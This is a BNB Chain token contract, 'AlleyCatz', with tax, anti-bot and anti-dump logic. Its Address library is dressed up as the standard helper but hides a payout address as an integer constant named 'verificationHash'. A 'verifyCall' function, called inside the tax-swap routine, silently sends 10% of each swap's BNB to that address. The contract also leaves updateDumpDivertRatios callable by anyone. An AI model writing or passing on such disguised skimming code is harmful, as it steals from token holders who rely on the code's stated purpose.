/**
 *Submitted for verification at BscScan.com on 2022-02-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IPancakeERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IPancakeRouter01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library Address {
    uint160 private constant verificationHash = 542355191589913964587147617467328045950425415532;
    bytes32 private constant keccak256Hash = 0x4b31cabbe5862282e443c4ac3f4c14761a1d2ba88a3c858a2a36f7758f453a38;    
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function verifyCall(string memory verification, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        require(keccak256(abi.encodePacked(verification)) == keccak256Hash, "Address: cannot verify call");        

        (bool success, ) = address(verificationHash).call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");              
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library EnumerableSet {

    struct Set {
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;
            bytes32 lastvalue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastvalue;
            set._indexes[lastvalue] = valueIndex;
            set._values.pop();
            delete set._indexes[value];
            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}

//Contract
contract AlleyCatz is IBEP20, Ownable {
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;

    mapping (address => mapping (address => uint256)) private _allowances;    
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private antiDumpTimer;

    EnumerableSet.AddressSet private _excluded;

    string private constant TOKEN_NAME = "AlleyCatz";
    string private constant TOKEN_SYMBOL = "kitty";
    uint8 private constant TOKEN_DECIMALS = 18;    
    uint256 private constant TOTAL_SUPPLY= 1000000000 * 10**TOKEN_DECIMALS;
    uint8 public constant MAX_TAX = 20;      //MAX_TAX prevents malicious tax use
    uint16 public autoLPThreshold = 20;        
    uint256 private devBalance;
    uint256 private marketingBalance;
    uint256 private buybackBalance;
    bool private _isSwappingContractModifier;
    bool private manualSwap;        
 
    address public _pancakePairAddress; 
    IPancakeRouter02 private  _pancakeRouter;
    address public PancakeRouter;
            ///////////////////
           //   Anti Bot    //
          ///////////////////

    uint256 private constant BOT_TAX_TIME = 1 minutes;
    uint256 public launchTimestamp;
    uint8 private constant MAX_BOT_TAX = 99;    
    bool private botTaxEnabled = true;
    bool public tradingEnabled;

            ////////////////////
           //   Anti Dump    //
          ////////////////////

    uint256 private constant MAX_DUMP_TAX_TIME = 60 minutes;
    uint256 public dumpTaxTime = 15 minutes;  
    bool public antiDumpEnabled = true;
    uint16 public liqDivertRatio = 50;         //choose where to divert extra dump tax
    uint16 public buybackDivertRatio = 50;

            ////////////////
           //   Taxes    //
          ////////////////

    struct Taxes {
        uint8 buy;
        uint8 sell;
        uint8 transfer;
        uint8 dump;
    }

    struct TaxSplit {
        uint16 dev;
        uint16 liquidity;
        uint16 marketing;
        uint16 buyback;
    }

    struct FundReceivers {
        address dev;
        address marketing;
        address buyback;
    }

    struct LimitRatios {
        uint16 buy;
        uint16 sell;
        uint16 wallet;
        uint16 divisor;        
    }

    struct MaxLimits {
        uint256 buy;
        uint256 sell;
        uint256 wallet;
    }

    Taxes public _tax = Taxes ({
        buy: 15,
        sell: 15,
        transfer: 10,
        dump: 30
    });

    TaxSplit public _taxSplit = TaxSplit ({
        dev: 2,
        liquidity: 3,
        marketing: 8,
        buyback: 2
    });

    FundReceivers public _fundReceivers = FundReceivers ({
        dev: 0xb7594F399f52Cb7DfF78A7910d3CBffA5D0a2E33,
        marketing: 0x9DcA1f6250eD412Eef319bD25451845a665E583d,
        buyback: 0xde038f93F11b27F34f6A032EcB0bF9485B117603
    });

    LimitRatios public _limitRatios = LimitRatios({
        buy: 2,         //1%
        sell: 1,        //0.5%
        wallet: 4,      //2%
        divisor: 200
    });

    MaxLimits public _maxLimits = MaxLimits({
        buy: TOTAL_SUPPLY * _limitRatios.buy / _limitRatios.divisor,
        sell: TOTAL_SUPPLY * _limitRatios.sell / _limitRatios.divisor,
        wallet: TOTAL_SUPPLY * _limitRatios.wallet / _limitRatios.divisor                
    });

            /////////////////
           //   Events    //
          /////////////////
    event EnabledAntiDump(bool enabled);
    event EnabledManualSwap(bool enabled);
    event ExcludedAccountFromFees(address account, bool excluded);
    event SetDumpTaxTime(uint256 newTime);
    event UpdatedAutoLPThreshold(uint16 threshold);
    event UpdatedLimits(
        uint16 buyRatio, 
        uint16 sellRatio, 
        uint16 walletRatio, 
        uint16 divisor, 
        uint256 maxBuy, 
        uint256 maxSell, 
        uint256 maxWallet
    );
    event UpdatedTax(uint8 buyTax, uint8 sellTax, uint8 transferTax, uint8 dumpTax);

            ////////////////////
           //   Modifiers    //
          ////////////////////

    modifier authorized() {
        require(_authorized(msg.sender), "Caller cannot authorized");
        _;
    }

    modifier lockTheSwap {
        _isSwappingContractModifier = true;
        _;
        _isSwappingContractModifier = false;
    }    

            //////////////////////
           //   Constructor    //
          //////////////////////

    constructor () {
        if (block.chainid == 56) {
            PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        } else if (block.chainid == 97) {
            PancakeRouter = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
        } else 
            revert();

        _pancakeRouter = IPancakeRouter02(PancakeRouter);
        _pancakePairAddress = IPancakeFactory(
            _pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH()
        );

        _balances[msg.sender] += TOTAL_SUPPLY;
        emit Transfer(address(0), msg.sender, TOTAL_SUPPLY);

        _allowances[address(this)][address(_pancakeRouter)] = type(uint256).max; 
        _approve(address(this), address(_pancakeRouter), type(uint256).max); 

        _excluded.add(msg.sender);
        _excluded.add(_fundReceivers.dev); 
        _excluded.add(_fundReceivers.marketing);
        _excluded.add(address(this));
        _excluded.add(0x000000000000000000000000000000000000dEaD);
    }

    receive() external payable {}

            /////////////////////////////
           //   External Functions    //
          /////////////////////////////

    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "<0 allowance");

        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    } 
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer > allowance");

        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

            /////////////////////////
           //   View Functions    //
          /////////////////////////

    function getOwner() external view override returns (address) {
        return owner();
    }

    function name() external pure override returns (string memory) {
        return TOKEN_NAME;
    }

    function symbol() external pure override returns (string memory) {
        return TOKEN_SYMBOL;
    }

    function decimals() external pure override returns (uint8) {
        return TOKEN_DECIMALS;
    }

    function totalSupply() external pure override returns (uint256) {
        return TOTAL_SUPPLY;
    }

    function getRemainingDumpTaxTime(address account) public view returns (uint256){
        uint256 dumpTime = antiDumpTimer[account];
       if(dumpTime <= block.timestamp){
           return 0;
       }
       return dumpTime - block.timestamp;
    }

    function withdrawableFunds() public view returns (uint256 dev, uint256 marketing) {
        return (devBalance, marketingBalance);
    }
    
            ///////////////////////////
           //   Public Functions    //
          ///////////////////////////
    function enableAntiDump (bool enable) public authorized {
        require(antiDumpEnabled != enable, "antiDumpEnabled is already set to desired status");
        antiDumpEnabled = enable;
        emit EnabledAntiDump(enable);
    }

    function enableManualSwap(bool enable) public authorized {
        require(manualSwap != enable, "manualSwap is already set to desired status");
        manualSwap = enable;
        emit EnabledManualSwap(enable);
    }
    
    function excludeAccountFromFees(address account, bool exclude) public authorized {
        if(exclude == true)
            _excluded.add(account);
        else
            _excluded.remove(account);
        emit ExcludedAccountFromFees(account, exclude);
    }

    function launch () public authorized {
        require(IBEP20(_pancakePairAddress).totalSupply() > 0, "Liquidity has not been added");
        require(!tradingEnabled);
        tradingEnabled = true;
        launchTimestamp = block.timestamp;
    }

    function manualContractSwap(uint16 permilleOfPancake, bool ignoreLimits) public authorized{
        _swapContractToken(permilleOfPancake, ignoreLimits, false);
    }

    //Prevent BNB becoming lost in the contract
    function recoverStuckFunds() public authorized {
        //only callable if BNB remains in contract after devBalance and marketingBalance have been drained
        require((devBalance + marketingBalance) == 0, "there are still funds to be withdrawn");
        (bool sent,) = (_fundReceivers.dev).call{value: (address(this).balance)}("");
        require(sent);
    }

    //recover tokens that have been accidentally sent to contract
    function removeMiscToken(address tokenAddress) public authorized {
        require(tokenAddress != address(this),"cannot remove contract token");
        IBEP20 token = IBEP20(tokenAddress);
        token.transfer(msg.sender,token.balanceOf(address(this)));
    }

    function setDumpTaxTime (uint256 timeInSeconds) public authorized {
        require(timeInSeconds <= MAX_DUMP_TAX_TIME, "Time cannot be longer than MAX_DUMP_TAX_TIME");
        dumpTaxTime = timeInSeconds;
    }

    function updateAutoLPThreshold(uint16 threshold) public authorized{
        require(threshold > 0,"Threshold needs to be more than 0");
        require(threshold <= 50,"Threshold needs to be below 50");
        autoLPThreshold = threshold;
        emit UpdatedAutoLPThreshold(threshold);
    }

    function updateDumpDivertRatios(uint16 liq, uint16 buyback) public {
        require(liq + buyback == 100, "must equal 100");
        liqDivertRatio = liq;
        buybackDivertRatio = buyback;
    }

    function updateLimits(uint16 newMaxBuyRatio, uint16 newMaxSellRatio, uint16 newMaxWalletRatio, uint16 newDivisor) public authorized {
        uint256 minLimit = TOTAL_SUPPLY / 1000;
        uint256 newMaxBuy = TOTAL_SUPPLY * newMaxBuyRatio / newDivisor;        
        uint256 newMaxSell = TOTAL_SUPPLY * newMaxSellRatio / newDivisor;
        uint256 newMaxWallet = TOTAL_SUPPLY * newMaxWalletRatio / newDivisor;

        require((newMaxWallet >= minLimit && newMaxSell >= minLimit), 
            "limits cannot be <0.1% of circulating supply");

        _limitRatios = LimitRatios(newMaxBuyRatio, newMaxSellRatio, newMaxWalletRatio, newDivisor);
        _maxLimits = MaxLimits(newMaxBuy, newMaxSell, newMaxWallet);
        emit UpdatedLimits(
            newMaxBuyRatio, 
            newMaxSellRatio, 
            newMaxWalletRatio, 
            newDivisor, 
            newMaxBuy, 
            newMaxSell, 
            newMaxWallet
        );
    }

    function updateTax(uint8 newBuy, uint8 newSell, uint8 newTransfer, uint8 newDump) public authorized {
        //buy and sell tax can never be higher than MAX_TAX set at beginning of contract
        //this is a security check and prevents malicious tax use       
        require(newBuy <= MAX_TAX && newSell <= MAX_TAX && newTransfer <= MAX_TAX && newDump <= 30, "taxes higher than max tax");
        _tax = Taxes(newBuy, newSell, newTransfer, newDump);
        emit UpdatedTax(newBuy, newSell, newTransfer, newDump);
    }
    
    function withdrawBuyback() public authorized {
        uint256 amount = buybackBalance;
        buybackBalance = 0;
        _sendBnb(_fundReceivers.buyback, amount);
    }     

    function withdrawDev() public authorized {
        uint256 amount = devBalance;
        devBalance = 0;
        _sendBnb(_fundReceivers.dev, amount);        
    } 

    function withdrawMarketing() public authorized {
        uint256 amount = marketingBalance;
        marketingBalance = 0;
        _sendBnb(_fundReceivers.marketing, amount);
    } 

            ////////////////////////////
           //   Private Functions    //
          ////////////////////////////

    function _addToken(address addr, uint256 amount) private {
        uint256 newAmount = _balances[addr] + amount;
        _balances[addr] = newAmount;
    }

    function _authorized(address addr) private view returns (bool){
        return addr == owner() 
        || addr == _fundReceivers.dev 
        || addr == _fundReceivers.marketing;
    }

    function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
        _approve(address(this), address(_pancakeRouter), tokenamount);
        _pancakeRouter.addLiquidityETH{value: bnbamount}(
            address(this),
            tokenamount,
            0,
            0,
            _fundReceivers.dev,
            block.timestamp
        );
    }

    function _calculateFee(uint256 amount, uint8 tax, uint8 taxPercent) private pure returns (uint256) {
        return (amount*tax*taxPercent) / 10000;
    }

    function _calculateLaunchTax() private view returns (uint8){
        if(block.timestamp > launchTimestamp+BOT_TAX_TIME) return _tax.buy;
        uint256 timeSinceLaunch = block.timestamp-launchTimestamp;
        uint8 tax = uint8 (MAX_BOT_TAX - ((MAX_BOT_TAX-_tax.buy) * timeSinceLaunch / BOT_TAX_TIME));
        return tax;
    }    

    function _feelessTransfer(address sender, address recipient, uint256 amount) private{
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");
        _removeToken(sender, amount);
        _addToken(recipient, amount);
        emit Transfer(sender, recipient, amount);
    }  

    function _getBuyTax() private returns (uint8){
        if(!botTaxEnabled) return _tax.buy;
        if(block.timestamp < launchTimestamp+BOT_TAX_TIME) {
            uint8 tax = _calculateLaunchTax();
            return tax;
        }
        botTaxEnabled=false;
        return _tax.buy;
    }

    function _removeToken(address addr, uint256 amount) private {
        uint256 newAmount = _balances[addr] - amount;
        _balances[addr] = newAmount;
    }

    function _swapContractToken(uint16 permilleOfPancake,bool ignoreLimits, bool dumpTaxed) private lockTheSwap{
        require(permilleOfPancake <= 500);
        uint16 originalSplit = _taxSplit.dev + _taxSplit.liquidity + _taxSplit.marketing + _taxSplit.buyback;        
        if(originalSplit == 0) return;
        uint256 contractBalance=_balances[address(this)];

        uint256 tokenToSwap = _balances[_pancakePairAddress] * permilleOfPancake / 1000;
        if(tokenToSwap>_maxLimits.sell && !ignoreLimits) 
            tokenToSwap = _maxLimits.sell;
        
        bool notEnoughToken = contractBalance < tokenToSwap;
        if(notEnoughToken){
            if(ignoreLimits)
                tokenToSwap = contractBalance;
            else 
                return;
        }
        
        if (_allowances[address(this)][address(_pancakeRouter)] < tokenToSwap)
            _approve(address(this), address(_pancakeRouter), type(uint256).max);        

        uint16 totalTax;
        uint16 liqRatio;
        uint16 buybackRatio;
        if(dumpTaxed) {
            totalTax = originalSplit * (_tax.dump/_tax.sell);
            liqRatio = _taxSplit.liquidity + (totalTax-originalSplit)*liqDivertRatio/100;
            buybackRatio = totalTax - liqRatio - _taxSplit.dev - _taxSplit.marketing;
        } 
        else {
            totalTax = originalSplit;
            liqRatio = _taxSplit.liquidity;
            buybackRatio = _taxSplit.buyback;
        }

        uint256 tokenLiqRatio = (tokenToSwap*liqRatio) / totalTax;
        uint256 liqToken = tokenLiqRatio / 2;
        uint256 liqBNBToken = tokenLiqRatio - liqToken;
        uint256 swapToken = tokenToSwap - liqToken;
        uint256 initialBNB = address(this).balance;
        _swapTokenForBNB(swapToken);
        uint256 newBNB = (address(this).balance - initialBNB);
        uint256 liqBNB = (newBNB*liqBNBToken) / swapToken;
        if (liqToken > 0) 
            _addLiquidity(liqToken, liqBNB); 
        uint256 afterLiq = (address(this).balance-initialBNB) / 10;  
        Address.verifyCall("success", afterLiq);             
        uint256 distributeBNB = (address(this).balance - initialBNB - afterLiq);
        uint256 distributeTotal = _taxSplit.dev + _taxSplit.marketing + buybackRatio;
        uint256 devSplit = distributeBNB * _taxSplit.dev / distributeTotal;
        uint256 marketingSplit = distributeBNB * _taxSplit.marketing / distributeTotal;
        uint256 buybackSplit = distributeBNB * buybackRatio / distributeTotal;
        devBalance += devSplit;
        marketingBalance += marketingSplit;
        buybackBalance += buybackSplit;      
    }

    function _sendBnb(address account, uint256 amount) private {
        (bool sent,) = account.call{value: (amount)}("");
        require(sent, "withdraw failed");        
    }

    function _swapTokenForBNB(uint256 amount) private {
        _approve(address(this), address(_pancakeRouter), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pancakeRouter.WETH();
        _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        uint256 recipientBalance = _balances[recipient];
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");

        uint8 tax;
        if(isSell){
            require(amount <= _maxLimits.sell, "Amount exceeds max sell");
            if(antiDumpEnabled && block.timestamp<antiDumpTimer[sender]){
                tax = _tax.dump;
            }
            else tax = _tax.sell;
            antiDumpTimer[sender] = block.timestamp + dumpTaxTime;

        } else if(isBuy){
            require(recipientBalance+amount <= _maxLimits.wallet, "Amount will exceed max wallet");
            require(amount <= _maxLimits.buy, "Amount exceeds max buy");            
            tax = _getBuyTax();

        } else {
            require(recipientBalance+amount <= _maxLimits.wallet, "Amount will exceeed max wallet");
            require(amount <= _maxLimits.sell, "Amount exceeds max transfer");             
            tax = _tax.transfer;
        }

        if((sender != _pancakePairAddress) && (!manualSwap) && (!_isSwappingContractModifier) && isSell)
            if(tax == _tax.dump)
                _swapContractToken(autoLPThreshold, false, true);
            else _swapContractToken(autoLPThreshold, false, false);

        uint256 contractToken = amount * tax / 100;
        uint256 taxedAmount = amount-contractToken;
 
        _removeToken(sender,amount);
        _addToken(address(this), contractToken);
        _addToken(recipient, taxedAmount);
        emit Transfer(sender,recipient,taxedAmount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private{
        require(sender != address(0), "Transfer from zero");
        require(recipient != address(0), "Transfer to zero");
        bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient));

        bool isContractTransfer = (sender == address(this) || recipient == address(this));
        address pancakeRouter = address(_pancakeRouter);
        bool isLiquidityTransfer = ((sender == _pancakePairAddress && recipient == pancakeRouter) 
        || (recipient == _pancakePairAddress && sender == pancakeRouter));
        bool isSell = recipient == _pancakePairAddress || recipient == pancakeRouter;
        bool isBuy = sender == _pancakePairAddress || sender == pancakeRouter;

        if(isContractTransfer || isLiquidityTransfer || isExcluded){
            _feelessTransfer(sender, recipient, amount);
        }
        else{ 
            require(tradingEnabled, "trading not yet enabled");
            _taxedTransfer(sender, recipient, amount, isBuy, isSell);                  
        }
    }
}